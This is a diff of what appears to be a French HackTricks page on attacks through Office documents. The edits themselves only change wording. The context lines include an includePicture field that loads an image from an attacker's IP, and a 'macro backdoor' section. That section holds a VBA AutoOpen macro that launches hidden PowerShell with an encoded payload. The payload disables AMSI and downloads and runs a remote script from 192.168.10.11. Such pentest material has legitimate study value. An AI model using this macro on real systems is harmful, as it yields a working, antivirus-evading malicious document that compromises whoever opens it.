@@ -27,27 +27,27 @@ Vous pouvez utiliser la commande suivante pour vérifier quelles extensions vont
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX files référencant un modèle distant (Fichier – Options – Compléments – Gérer : Modèles – Aller) qui inclut des macros peuvent également “exécuter” des macros.
+DOCX files faisant référence à un modèle distant (Fichier – Options – Compléments – Gérer : Modèles – Aller) qui inclut des macros peuvent également “exécuter” des macros.
 
-### Chargement d'image externe
+### Chargement d'Image Externe
 
 Allez à : _Insérer --> Éléments rapides --> Champ_\
-&#xNAN;_**Catégories** : Liens et références, **Noms de champ** : includePicture, et **Nom de fichier ou URL** :_ http://\<ip>/whatever
+&#xNAN;_**Catégories** : Liens et Références, **Noms de champ** : includePicture, et **Nom de fichier ou URL** :_ http://\<ip>/whatever
 
 ![](<../../.gitbook/assets/image (155).png>)
 
-### Backdoor de macros
+### Backdoor de Macros
 
 Il est possible d'utiliser des macros pour exécuter du code arbitraire à partir du document.
 
-#### Fonctions d'autoload
+#### Fonctions d'Autoload
 
 Plus elles sont courantes, plus il est probable que l'AV les détecte.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Exemples de code de macros
+#### Exemples de Code de Macros
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -180,7 +180,7 @@ Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png"
 
 <summary>Soutenir HackTricks</summary>
 
-* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* Vérifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
